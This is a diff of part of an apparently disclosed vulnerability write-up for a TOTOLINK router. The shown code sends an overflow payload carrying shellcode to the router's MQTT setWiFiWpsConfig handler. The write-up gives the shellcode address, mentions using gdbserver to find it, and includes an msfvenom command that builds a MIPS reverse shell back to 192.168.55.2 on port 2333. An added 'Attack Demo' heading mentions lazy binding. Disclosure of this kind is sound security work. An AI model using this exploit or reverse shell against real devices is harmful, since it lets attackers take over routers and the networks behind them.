@@ -60,14 +60,18 @@ client = mqtt.Client()
 client.connect("192.168.55.1",1883,60)
 client.publish('totolink/router/setting/setWiFiWpsConfig',payload='{"topicurl":"setting/setWiFiWpsConfig","WiFiIdx":"0","PINPBCRadio":"1","PINMode":"1","PIN":"'+test+'"}'+'bling'+buf)
 ```
-PS:
----
+**PS:**
 The offset maybe different in each device. <br>
 **\x44\x03\x42** is the address which shellcode in,to get the address,you need to use gdbserver. <br>
 The shellcode is which made by msf to reverse the shell <br>
 ```python
 sfvenom -p linux/mipsle/shell_reverse_tcp LHOST=192.168.55.2 LPORT=2333 -f py -o shellcode.txt
 ```
+
+Attack Demo
+========
+Because of Lazy binding mechanism，so we can send some short dirty data at first, the execute our exploit.
+
 
 
 
